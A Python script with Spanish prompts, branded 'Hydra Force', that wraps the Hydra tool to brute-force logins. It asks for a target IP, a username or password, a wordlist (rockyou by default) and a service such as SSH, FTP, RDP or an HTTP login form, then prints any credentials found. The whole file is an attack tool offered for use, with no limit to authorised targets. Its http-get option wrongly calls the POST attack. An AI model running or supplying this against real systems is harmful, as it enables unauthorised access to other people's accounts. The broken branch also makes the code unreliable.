#!/usr/bin/env python3
import subprocess as sp
import ipaddress as add
from pathlib import Path
import re
import sys

# Paleta ANSI
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"
BOLD = "\033[1m"

print(f"""{CYAN}
    ─────────────────────────────────
    ╦ ╦╦ ╦╔╦╗╦═╗╔═╗  ╔═╗╔═╗╦═╗╔═╗╔═╗
    ╠═╣╚╦╝ ║║╠╦╝╠═╣  ╠╣ ║ ║╠╦╝║  ║╣ 
    ╩ ╩ ╩ ═╩╝╩╚═╩ ╩  ╚  ╚═╝╩╚═╚═╝╚═╝
    ───────────────────────────────── 
{RESET}""")

print(f"{YELLOW}Digite la IP del objetivo{RESET}")
ip = input(">>> ").strip()

def victima(ip):
    try:
        add.ip_address(ip)
        return True
    except ValueError:
        return False

if not victima(ip):
    print(f"{RED}IP no válida!{RESET}")
    sys.exit(1)

print("")
print(f"{YELLOW}Digite el numero para escoger una opcion{RESET}")
print(" [1] tengo el usuario + wordlist de contraseñas")
print(" [2] wordlist de usuarios + tengo la contraseña")
opcion = input(">>> ").strip()

usuario = None
contraseña = None
diccionario_usuarios = None
diccionario_contraseñas = None

if opcion == "1":
    usuario = input(f"{YELLOW}Digite el usuario{RESET}\n>>> ").strip()
elif opcion == "2":
    contraseña = input(f"{YELLOW}Digite la contraseña{RESET}\n>>> ").strip()
else:
    print(f"{RED}Opción no válida!{RESET}")
    sys.exit(1)

def obtener_diccionario(dic_usuario: str, tipo: str):
    destino = Path.cwd() / f"rockyou_{tipo}.txt"
    sys_txt = Path(f"/usr/share/wordlists/rockyou_{tipo}.txt")
    sys_gz = Path(f"/usr/share/wordlists/rockyou_{tipo}.txt.gz")
    
    # Fallback a rockyou.txt genérico si no existe el específico
    destino_generico = Path.cwd() / "rockyou.txt"
    sys_txt_generico = Path("/usr/share/wordlists/rockyou.txt")
    sys_gz_generico = Path("/usr/share/wordlists/rockyou.txt.gz")

    if dic_usuario.strip():
        ruta = Path(dic_usuario).expanduser()
        if ruta.exists():
            return ruta
        raise FileNotFoundError(f"No existe: {ruta}")

    if destino.exists():
        return destino

    if sys_txt.exists():
        sp.run(["cp", str(sys_txt), str(destino)], check=True)
        return destino

    if sys_gz.exists():
        sp.run(["gunzip", "-k", str(sys_gz)], check=True)
        if sys_txt.exists():
            sp.run(["cp", str(sys_txt), str(destino)], check=True)
            return destino
        raise FileNotFoundError(f"Error al descomprimir rockyou_{tipo}.txt.gz")

    # Intentar con el genérico si no existe el específico
    if destino_generico.exists():
        return destino_generico

    if sys_txt_generico.exists():
        sp.run(["cp", str(sys_txt_generico), str(destino_generico)], check=True)
        return destino_generico

    if sys_gz_generico.exists():
        sp.run(["gunzip", "-k", str(sys_gz_generico)], check=True)
        if sys_txt_generico.exists():
            sp.run(["cp", str(sys_txt_generico), str(destino_generico)], check=True)
            return destino_generico

    raise FileNotFoundError(f"No se encontró diccionario para {tipo}")

print("")
if opcion == "1":
    diccionario = input(
        f"{YELLOW}Escribe aqui la ruta del diccionario de CONTRASEÑAS que quieras usar "
        f"[Enter para omitir (se utilizara el diccionario por default)]{RESET}\n>>> "
    )
    try:
        diccionario_contraseñas = obtener_diccionario(diccionario, "contraseñas")
        print(f"{GREEN}Usando diccionario de contraseñas:{RESET} {diccionario_contraseñas}")
    except Exception as e:
        print(f"{RED}Error:{RESET}", e)
        sys.exit(1)

elif opcion == "2":
    diccionario = input(
        f"{YELLOW}Escribe aqui la ruta del diccionario de USUARIOS que quieras usar "
        f"[Enter para omitir (se utilizara el diccionario por default)]{RESET}\n>>> "
    )
    try:
        diccionario_usuarios = obtener_diccionario(diccionario, "usuarios")
        print(f"{GREEN}Usando diccionario de usuarios:{RESET} {diccionario_usuarios}")
    except Exception as e:
        print(f"{RED}Error:{RESET}", e)
        sys.exit(1)

print("")
servicio = input(
    f"{YELLOW}Digite el servicio a atacar (ej: ssh, ftp, telnet, rdp, http-get, http-post){RESET}\n>>> "
).strip().lower()

puerto = input(f"{YELLOW}Puerto [Enter para default]:{RESET} ").strip()

def ejecutar(cmd):
    print(f"{CYAN}{' '.join(cmd)}{RESET}")
    try:
        proc = sp.Popen(cmd, stdout=sp.PIPE, stderr=sp.STDOUT, text=True)
    except FileNotFoundError:
        print(f"{RED}Error: Hydra no está instalado o no se encuentra en el PATH{RESET}")
        sys.exit(1)
    
    encontrados = []

    for line in proc.stdout:
        print(line, end="")
        match = re.search(r'login:\s*(\S+)\s+password:\s*(\S+)', line, re.IGNORECASE)
        if match:
            encontrados.append((match.group(1), match.group(2)))

    proc.wait()
    
    if proc.returncode != 0 and proc.returncode != 255:
        print(f"{YELLOW}Hydra terminó con código de salida: {proc.returncode}{RESET}")

    if encontrados:
        print(f"\n{GREEN}=== Credenciales encontradas ==={RESET}")
        for u, p in encontrados:
            print(f"{RED}{BOLD}{u}{RESET}: {RED}{BOLD}{p}{RESET}")
    else:
        print(f"\n{YELLOW}No se encontraron credenciales.{RESET}")

def ataque_normal_usuario():
    if not usuario or not diccionario_contraseñas:
        print(f"{RED}Error: Faltan datos necesarios (usuario o diccionario de contraseñas){RESET}")
        return
    print(f"{CYAN}Iniciando ataque Hydra...{RESET}")
    cmd = [
        "hydra",
        "-l", usuario,
        "-P", str(diccionario_contraseñas),
        f"{servicio}://{ip}"
    ]
    if puerto:
        cmd.extend(["-s", puerto])
    ejecutar(cmd)

def ataque_normal_contra():
    if not contraseña or not diccionario_usuarios:
        print(f"{RED}Error: Faltan datos necesarios (contraseña o diccionario de usuarios){RESET}")
        return
    print(f"{CYAN}Iniciando ataque Hydra...{RESET}")
    cmd = [
        "hydra",
        "-p", contraseña,
        "-L", str(diccionario_usuarios),
        f"{servicio}://{ip}"
    ]
    if puerto:
        cmd.extend(["-s", puerto])
    ejecutar(cmd)

def ataque_http_get():
    if opcion != "1":
        print(f"{RED}Para http-get necesitas usuario + wordlist de contraseñas{RESET}")
        sys.exit(1)
    
    ruta = input(f"{YELLOW}Ruta del recurso (ej: /login) [Enter para /]:{RESET}\n>>> ").strip()
    if not ruta:
        ruta = "/"
    
    print(f"{CYAN}Iniciando ataque HTTP GET...{RESET}")
    cmd = [
        "hydra",
        "-l", usuario,
        "-P", str(diccionario_contraseñas),
        f"http-get://{ip}{ruta}"
    ]
    if puerto:
        cmd.extend(["-s", puerto])
    ejecutar(cmd)

def ataque_http_post():
    if opcion != "1":
        print(f"{RED}Para http-post necesitas usuario + wordlist de contraseñas{RESET}")
        sys.exit(1)
    
    ruta = input(f"{YELLOW}Ruta del formulario (ej: /login.php) [Enter para /login.php]:{RESET}\n>>> ").strip()
    if not ruta:
        ruta = "/login.php"
    
    campos = input(f"{YELLOW}Campos del formulario (ej: username=^USER^&password=^PASS^) [Enter para default]:{RESET}\n>>> ").strip()
    if not campos:
        campos = "username=^USER^&password=^PASS^"
    
    mensaje_error = input(f"{YELLOW}Mensaje de error cuando falla el login (ej: incorrecto, failed, invalid) [Enter para omitir]:{RESET}\n>>> ").strip()
    
    print(f"{CYAN}Iniciando ataque HTTP POST...{RESET}")
    
    if mensaje_error:
        cmd = [
            "hydra",
            "-l", usuario,
            "-P", str(diccionario_contraseñas),
            f"http-post-form://{ip}{ruta}:{campos}:F={mensaje_error}"
        ]
    else:
        cmd = [
            "hydra",
            "-l", usuario,
            "-P", str(diccionario_contraseñas),
            f"http-post-form://{ip}{ruta}:{campos}"
        ]
    
    if puerto:
        cmd.extend(["-s", puerto])
    ejecutar(cmd)

print("")
print(f"{GREEN}>>> Ejecutando ataque...{RESET}")

if servicio in ["ssh", "ftp", "telnet", "smtp", "pop3", "imap", "rdp"]:
    if opcion == "1":
        ataque_normal_usuario()
    elif opcion == "2":
        ataque_normal_contra()

elif servicio == "http-get":
    ataque_http_post()

elif servicio == "http-post":
    ataque_http_post()

else:
    print(f"{RED}Servicio no soportado aun!{RESET}")